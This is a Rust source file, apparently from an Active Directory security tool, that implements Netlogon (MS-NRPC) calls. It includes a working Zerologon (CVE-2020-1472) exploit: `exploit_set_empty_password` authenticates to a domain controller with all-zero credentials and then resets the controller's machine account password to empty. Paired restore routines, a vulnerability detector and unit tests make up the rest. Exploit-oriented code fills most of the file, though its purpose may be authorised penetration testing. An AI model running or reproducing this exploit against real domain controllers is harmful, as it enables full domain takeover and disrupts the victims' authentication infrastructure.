//! MS-NRPC (Netlogon) — thin veneer that re-exports the defensive
//! byte-level primitives from [`ms_nrpc`] and keeps the destructive Zerologon
//! (CVE-2020-1472) **exploit** and **restore** paths inline here, gated behind
//! the historic `dcerpc::netlogon` module for callers (adhammer) that already
//! depend on them.
//!
//! ## Split rationale
//! - Defensive/detect: the pure byte-level helpers (`aes_cfb8_encrypt`,
//!   `session_key`, `encode_req_challenge`, `encode_authenticate3`,
//!   `ret_status`) plus the shared constants (`EMPTY_NT_OWF`,
//!   `SERVER_SECURE_CHANNEL`, `NEG_FLAGS`, `STATUS_SUCCESS`) come straight from
//!   [`ms_nrpc::secure_channel`] via `pub use`. Detection callers SHOULD prefer
//!   [`ms_nrpc::detect`] directly.
//! - Destructive/exploit: `exploit_set_empty_password`, `restore_password`,
//!   `restore_password_cleartext` and their helpers (`encode_password_set`,
//!   `encode_password_set2`, `encode_password_set2_enc`, `nl_trust_password`)
//!   stay here. They are the CVE-2020-1472 write path (`NetrServerPasswordSet2`
//!   with an all-zero authenticator) and the paired restore.
//!
//! ## Why some symbols were not re-exported
//! [`ms_nrpc`] depends on `dcerpc = "0.2"` from crates.io; when built inside
//! this workspace against the local `dcerpc` crate that is one version ahead,
//! the two `dcerpc::Syntax` / `dcerpc::transport::RpcTcp` types are treated as
//! **distinct** by rustc. Any ms-nrpc symbol whose signature exposes those
//! types (`netlogon_syntax`, `detect_zerologon`, `Zerologon`) therefore cannot
//! be re-exported into this crate's public API without a type mismatch at
//! every call site. Those symbols are re-implemented locally, in terms of the
//! same wire encoders, so the runtime behaviour is identical.

// Pure byte-level primitives — re-exported verbatim from ms-nrpc so both
// crates emit identical NDR stubs and use identical crypto.
pub use ms_nrpc::secure_channel::{
    aes_cfb8_encrypt, encode_authenticate3, encode_req_challenge, ret_status, session_key,
    EMPTY_NT_OWF, NEG_FLAGS, SERVER_SECURE_CHANNEL, STATUS_SUCCESS,
};

use crate::ndr::NdrEncoder;
use crate::transport::RpcTcp;
use crate::{epm, Result, RpcError, Syntax};

/// The Netlogon RPC interface (MS-NRPC), reachable over ncacn_ip_tcp via the
/// endpoint mapper. Redefined locally so the returned `Syntax` is this crate's
/// type (see module doc for the crate-version rationale).
pub fn netlogon_syntax() -> Syntax {
    Syntax::new("12345678-1234-abcd-ef00-01234567cffb", 1, 0)
}

/// Netlogon opnums. `REQ_CHALLENGE` and `AUTHENTICATE3` are re-exported from
/// [`ms_nrpc::secure_channel::opnum`]; the two password-set opnums stay here
/// because they drive the destructive path.
pub mod opnum {
    pub use ms_nrpc::secure_channel::opnum::{AUTHENTICATE3, REQ_CHALLENGE};
    /// `NetrServerPasswordSet` — used by the restore path to set an NT OWF.
    pub const PASSWORD_SET: u16 = 6;
    /// `NetrServerPasswordSet2` — used by the exploit (zero payload) and the
    /// cleartext restore.
    pub const PASSWORD_SET2: u16 = 30;
}

/// NetrServerPasswordSet2 with an all-zero authenticator and all-zero ClearNewPassword — the
/// Zerologon exploit step that sets the DC machine account password to **empty**. DESTRUCTIVE.
/// NL_TRUST_PASSWORD is a fixed 516-byte buffer; all zeros ⇒ empty password under the zero session.
fn encode_password_set2(netbios: &str) -> Vec<u8> {
    let account = format!("{netbios}$");
    let mut e = NdrEncoder::new();
    e.referent(); // PrimaryName (unique)
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(&account); // AccountName (ref)
    e.align(2);
    e.u16(SERVER_SECURE_CHANNEL); // SecureChannelType
    e.align(4);
    e.conformant_varying_wstr(netbios); // ComputerName (ref)
    e.align(4);
    // NETLOGON_AUTHENTICATOR: Credential[8] + Timestamp(4) — all zero.
    e.bytes(&[0u8; 12]);
    // NL_TRUST_PASSWORD: Buffer[512] + Length(4) — all zero ⇒ empty.
    e.bytes(&[0u8; 516]);
    e.into_bytes()
}

/// NetrServerPasswordSet(PrimaryName[unique], AccountName[str], SecureChannelType, ComputerName[str],
/// Authenticator, EncryptedNtOwf[16]). Restores the machine account to a specific NT hash.
fn encode_password_set(netbios: &str, enc_owf: &[u8; 16]) -> Vec<u8> {
    let account = format!("{netbios}$");
    let mut e = NdrEncoder::new();
    e.referent(); // PrimaryName (unique)
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(&account); // AccountName
    e.align(2);
    e.u16(SERVER_SECURE_CHANNEL);
    e.align(4);
    e.conformant_varying_wstr(netbios); // ComputerName
    e.align(4);
    e.bytes(&[0u8; 12]); // NETLOGON_AUTHENTICATOR (zero — valid in the zerologon session)
    e.bytes(enc_owf); // ENCRYPTED_NT_OWF_PASSWORD
    e.into_bytes()
}

/// Zerologon RESTORE: re-establish the zero-auth channel and set the machine account's NT hash back
/// to `target_nt` via NetrServerPasswordSet, so AD matches the DC's untouched local secret again.
/// Assumes the machine password is currently EMPTY (i.e. right after [`exploit_set_empty_password`]);
/// the session key is derived from the empty NTOWF. Returns Ok(true) if the restore was accepted.
pub async fn restore_password(
    host: &str,
    netbios: &str,
    target_nt: &[u8; 16],
    max_attempts: u32,
) -> Result<bool> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;
    let zero = [0u8; 8];
    for _ in 1..=max_attempts {
        let ch = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let server_ch: [u8; 8] = ch
            .get(0..8)
            .and_then(|b| b.try_into().ok())
            .ok_or_else(|| RpcError::Protocol("short ReqChallenge reply".into()))?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            // Machine password is empty → session key from the empty NTOWF + this server challenge.
            let sk = session_key(&EMPTY_NT_OWF, &zero, &server_ch);
            let enc = aes_cfb8_encrypt(&sk, target_nt);
            let mut enc_owf = [0u8; 16];
            enc_owf.copy_from_slice(&enc);
            let resp = rpc
                .call(opnum::PASSWORD_SET, &encode_password_set(netbios, &enc_owf))
                .await?;
            return Ok(ret_status(&resp) == STATUS_SUCCESS);
        }
    }
    Ok(false)
}

/// Build an NL_TRUST_PASSWORD (516 bytes): the UTF-16LE password right-aligned in a 512-byte
/// buffer (front is padding the server ignores) + a 4-byte byte-length. Restoring the CLEARTEXT
/// (not just the OWF) makes AD regenerate every key — NT *and* the AES keys the schannel needs.
fn nl_trust_password(password: &str) -> [u8; 516] {
    let utf16: Vec<u8> = password
        .encode_utf16()
        .flat_map(|u| u.to_le_bytes())
        .collect();
    // The buffer holds at most 512 bytes; clamp so an over-long cleartext can't underflow the slice
    // (machine passwords are <= 120 chars in practice, so this never triggers for real secrets).
    let len = utf16.len().min(512);
    let mut buf = [0u8; 516];
    buf[(512 - len)..512].copy_from_slice(&utf16[utf16.len() - len..]);
    buf[512..516].copy_from_slice(&(len as u32).to_le_bytes());
    buf
}

/// Same NDR shape as [`encode_password_set2`] but carrying an already-encrypted 516-byte
/// NL_TRUST_PASSWORD instead of the all-zero exploit payload.
fn encode_password_set2_enc(netbios: &str, enc_pw: &[u8; 516]) -> Vec<u8> {
    let account = format!("{netbios}$");
    let mut e = NdrEncoder::new();
    e.referent();
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.conformant_varying_wstr(&account);
    e.align(2);
    e.u16(SERVER_SECURE_CHANNEL);
    e.align(4);
    e.conformant_varying_wstr(netbios);
    e.align(4);
    e.bytes(&[0u8; 12]); // zero authenticator (valid in the zerologon session)
    e.bytes(enc_pw);
    e.into_bytes()
}

/// Full Zerologon RESTORE: re-establish the zero channel and set the machine account back to a
/// known CLEARTEXT via NetrServerPasswordSet2, so AD regenerates NT **and** AES keys to match the
/// DC's local secret (healing the AES secure channel, not just NTLM). Assumes the machine password
/// is currently empty (post-exploit). Returns Ok(true) if accepted.
pub async fn restore_password_cleartext(
    host: &str,
    netbios: &str,
    password: &str,
    max_attempts: u32,
) -> Result<bool> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;
    let zero = [0u8; 8];
    for _ in 1..=max_attempts {
        let ch = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let server_ch: [u8; 8] = ch
            .get(0..8)
            .and_then(|b| b.try_into().ok())
            .ok_or_else(|| RpcError::Protocol("short ReqChallenge reply".into()))?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            let sk = session_key(&EMPTY_NT_OWF, &zero, &server_ch);
            let enc = aes_cfb8_encrypt(&sk, &nl_trust_password(password));
            let mut enc_pw = [0u8; 516];
            enc_pw.copy_from_slice(&enc);
            let resp = rpc
                .call(
                    opnum::PASSWORD_SET2,
                    &encode_password_set2_enc(netbios, &enc_pw),
                )
                .await?;
            return Ok(ret_status(&resp) == STATUS_SUCCESS);
        }
    }
    Ok(false)
}

/// Outcome of a Zerologon probe. Mirrors [`ms_nrpc::detect::Zerologon`] but lives
/// here so it stays this crate's type across the local dcerpc `Result` chain (the
/// upstream enum comes from a version-pinned `dcerpc` and cannot be re-exported;
/// see module doc for the crate-version rationale).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Zerologon {
    /// A NetrServerAuthenticate3 accepted the all-zero credential — the DC is vulnerable.
    Vulnerable { attempts: u32 },
    /// Every attempt was rejected (STATUS_ACCESS_DENIED) — patched / not vulnerable.
    NotVulnerable { attempts: u32 },
}

/// Safe Zerologon detection: bind Netlogon over ncacn_ip_tcp and try the all-zero
/// challenge/credential handshake up to `max_attempts` (impacket uses 2000; success is expected
/// within ~256 on a vulnerable DC). Returns as soon as one attempt succeeds. Never resets the
/// machine password. Runs against the local `dcerpc` transport (see module doc).
pub async fn detect_zerologon(host: &str, netbios: &str, max_attempts: u32) -> Result<Zerologon> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;

    let zero = [0u8; 8];
    for attempt in 1..=max_attempts {
        // Establish a fresh challenge pair, then try to authenticate with all-zeros.
        let _ = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            return Ok(Zerologon::Vulnerable { attempts: attempt });
        }
    }
    Ok(Zerologon::NotVulnerable {
        attempts: max_attempts,
    })
}

/// Zerologon EXPLOIT: bypass Netlogon auth (as [`detect_zerologon`]), then immediately call
/// NetrServerPasswordSet2 to set the DC machine account password to **empty**. DESTRUCTIVE — the
/// DC's secure channel breaks until the password is restored (callers MUST restore). Returns
/// `Ok(true)` if the reset was accepted, `Ok(false)` if the DC is not vulnerable.
pub async fn exploit_set_empty_password(
    host: &str,
    netbios: &str,
    max_attempts: u32,
) -> Result<bool> {
    let port = epm::resolve_port(host, netlogon_syntax()).await?;
    let mut rpc = RpcTcp::connect(&format!("{host}:{port}")).await?;
    rpc.bind(netlogon_syntax()).await?;
    let zero = [0u8; 8];
    for _ in 1..=max_attempts {
        let _ = rpc
            .call(opnum::REQ_CHALLENGE, &encode_req_challenge(netbios, &zero))
            .await?;
        let auth = rpc
            .call(opnum::AUTHENTICATE3, &encode_authenticate3(netbios, &zero))
            .await?;
        if ret_status(&auth) == STATUS_SUCCESS {
            // Auth bypassed on this session — reset the machine password (unsigned, zero authenticator).
            let resp = rpc
                .call(opnum::PASSWORD_SET2, &encode_password_set2(netbios))
                .await?;
            return Ok(ret_status(&resp) == STATUS_SUCCESS);
        }
    }
    Ok(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn syntax_uuid() {
        // Netlogon interface UUID parses (local Syntax, not ms-nrpc's).
        let s = netlogon_syntax();
        assert_eq!(s.ver_major, 1);
    }

    #[test]
    fn destructive_opnums_present() {
        assert_eq!(opnum::PASSWORD_SET, 6);
        assert_eq!(opnum::PASSWORD_SET2, 30);
    }

    #[test]
    fn password_set2_stub_is_all_zero_payload() {
        // Exploit-shaped stub carries a 12-byte zero authenticator followed by a
        // 516-byte zero NL_TRUST_PASSWORD. Assert that the trailing 528 bytes are zero.
        let b = encode_password_set2("DC01");
        let tail = &b[b.len() - (12 + 516)..];
        assert!(tail.iter().all(|&x| x == 0));
    }

    #[test]
    fn nl_trust_password_right_aligns_and_records_length() {
        let buf = nl_trust_password("abc");
        // UTF-16LE("abc") is 6 bytes → written into buf[512-6..512].
        assert_eq!(&buf[506..512], &[b'a', 0, b'b', 0, b'c', 0]);
        // Trailing 4-byte length is 6.
        assert_eq!(u32::from_le_bytes(buf[512..516].try_into().unwrap()), 6);
    }

    #[test]
    fn reexports_match_ms_nrpc() {
        // The defensive re-exports carry the same byte-level identity as ms-nrpc.
        assert_eq!(EMPTY_NT_OWF, ms_nrpc::secure_channel::EMPTY_NT_OWF);
        assert_eq!(SERVER_SECURE_CHANNEL, 6);
        assert_eq!(NEG_FLAGS, 0x212f_ffff);
        assert_eq!(STATUS_SUCCESS, 0);
        assert_eq!(opnum::REQ_CHALLENGE, 4);
        assert_eq!(opnum::AUTHENTICATE3, 26);
    }

    #[test]
    fn req_challenge_bytes_match_ms_nrpc() {
        // Extra confidence: dcerpc's re-exported encoder and ms-nrpc's produce identical bytes.
        let ours = encode_req_challenge("DC01", &[0u8; 8]);
        let upstream = ms_nrpc::secure_channel::encode_req_challenge("DC01", &[0u8; 8]);
        assert_eq!(ours, upstream);
    }

    #[test]
    fn authenticate3_bytes_match_ms_nrpc() {
        let ours = encode_authenticate3("DC01", &[0u8; 8]);
        let upstream = ms_nrpc::secure_channel::encode_authenticate3("DC01", &[0u8; 8]);
        assert_eq!(ours, upstream);
    }
}
